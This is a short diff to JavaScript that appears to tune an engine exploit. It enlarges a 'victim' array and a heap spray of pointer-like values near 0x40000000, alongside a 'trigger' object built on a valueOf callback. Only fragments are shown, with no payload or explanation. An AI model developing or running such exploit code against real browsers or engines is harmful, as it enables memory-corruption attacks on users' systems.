@@ -18,7 +18,7 @@ for (var i = 0; i < 1000; i++) {
 
 
 var victim_index = 500;
-var victim = new Array(1024); 
+var victim = new Array(10000); 
 
 var trigger = {
     valueOf: function() {
@@ -28,7 +28,7 @@ var trigger = {
 };
 
 var pointer_like_data = [];
-for (var i = 0; i < 1000; i++) {
+for (var i = 0; i < 10000; i++) {
     pointer_like_data.push(0x40000000 + i * 0x1000); 
 }
 
